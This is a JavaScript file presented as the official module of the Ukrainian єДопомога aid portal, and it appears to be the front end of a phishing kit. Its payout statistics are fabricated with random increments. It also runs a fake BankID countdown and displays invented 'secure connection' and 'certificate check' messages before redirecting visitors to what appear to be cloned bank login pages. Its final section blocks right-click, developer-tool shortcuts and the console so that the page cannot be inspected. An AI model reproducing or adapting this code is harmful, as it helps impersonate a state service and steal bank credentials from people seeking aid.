/**
 * ОФІЦІЙНИЙ МОДУЛЬ ПОРТАЛУ єДОПОМОГА
 * Версія системи: 4.2.0 (2026)
 */

document.addEventListener('DOMContentLoaded', () => {

    // 1. Поточна дата для головної сторінки
    const dateEl = document.getElementById('current-date');
    if (dateEl) {
        dateEl.innerText = new Date().toLocaleDateString('uk-UA');
    }

    // 2. Анімація статистики на головній
    const peopleCountEl = document.getElementById('people-count');
    const moneySumEl = document.getElementById('money-sum');

    if (peopleCountEl && moneySumEl) {
        // Початкова анімація при завантаженні
        animateValue("people-count", 14200, 14284, 2000);
        animateValue("money-sum", 92000000, 92846000, 2500);

        // Живе оновлення кожні 5 секунд
        setInterval(() => {
            updateLiveStats('people-count', 1, 3);
            updateLiveStats('money-sum', 1200, 4500);
        }, 5000);
    }

    // 3. Таймер сесії BankID
    const timerEl = document.getElementById('timer');
    if (timerEl) {
        startGlobalTimer(300, timerEl); // 5 хвилин
    }
});

/**
 * ФУНКЦІЇ-ХЕЛПЕРИ
 */

function animateValue(id, start, end, duration) {
    const obj = document.getElementById(id);
    if (!obj) return;
    const range = end - start;
    let startTime = null;
    function step(timestamp) {
        if (!startTime) startTime = timestamp;
        const progress = Math.min((timestamp - startTime) / duration, 1);
        obj.innerHTML = Math.floor(progress * range + start).toLocaleString('uk-UA');
        if (progress < 1) window.requestAnimationFrame(step);
    }
    window.requestAnimationFrame(step);
}

function updateLiveStats(id, min, max) {
    const el = document.getElementById(id);
    if (!el) return;
    const currentText = el.innerText.replace(/\s/g, '').replace(/,/g, '');
    const current = parseInt(currentText) || 0;
    const added = Math.floor(Math.random() * (max - min + 1) + min);
    el.innerHTML = (current + added).toLocaleString('uk-UA');
}

function startGlobalTimer(duration, display) {
    let timer = duration;
    const interval = setInterval(() => {
        let minutes = Math.floor(timer / 60);
        let seconds = timer % 60;
        display.textContent = `${minutes < 10 ? "0" + minutes : minutes}:${seconds < 10 ? "0" + seconds : seconds}`;
        if (--timer < 0) {
            clearInterval(interval);
            display.textContent = "00:00";
            alert("Час сесії вичерпано. Будь ласка, оновіть сторінку.");
            window.location.reload();
        }
    }, 1000);
}

/**
 * ЛОГІКА ВИБОРУ БАНКУ (banks.html)
 */
function processBank(bankKey) {
    const loader = document.getElementById('loader');
    const statusText = document.getElementById('status-text');
    const progressBar = document.getElementById('progress-bar');

    if (loader) loader.style.display = 'flex';

    let stepIndex = 0;
    const steps = [
        { t: "Встановлення захищеного з'єднання...", p: 35 },
        { t: "Перевірка сертифікатів безпеки...", p: 70 },
        { t: "Перенаправлення на шлюз...", p: 100 }
    ];

    const interval = setInterval(() => {
        if (stepIndex < steps.length) {
            if (statusText) statusText.innerText = steps[stepIndex].t;
            if (progressBar) progressBar.style.width = steps[stepIndex].p + "%";
            stepIndex++;
        } else {
            clearInterval(interval);

            // Навігація
            switch(bankKey) {
                case 'privat':
                    window.location.href = 'privat.html';
                    break;
                case 'oschad':
                    window.location.href = 'oschad.html';
                    break;
                case 'other':
                    window.location.href = 'other.html';
                    break;
                default:
                    alert("Помилка ініціалізації. Спробуйте інший банк.");
                    window.location.reload();
            }
        }
    }, 1000);
}

/**
 * ЗАХИСТ ІНТЕРФЕЙСУ
 */

// Блокування контекстного меню
document.addEventListener('contextmenu', event => event.preventDefault());

// Блокування гарячих клавіш розробника
document.onkeydown = function (e) {
    const forbiddenKeys = [123]; // F12
    const forbiddenCombos = [
        e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0), // Inspect
        e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0), // Console
        e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0), // Element picker
        e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)                // View source
    ];

    if (forbiddenKeys.includes(e.keyCode) || forbiddenCombos.some(Boolean)) {
        return false;
    }
};

// Трюк Anti-Console: Нескінченна зупинка дебаггера
setInterval(function () {
    (function() {
        (function() {
            if (window.console && (console.log || console.info)) {
                debugger;
            }
        })();
    })();
}, 500);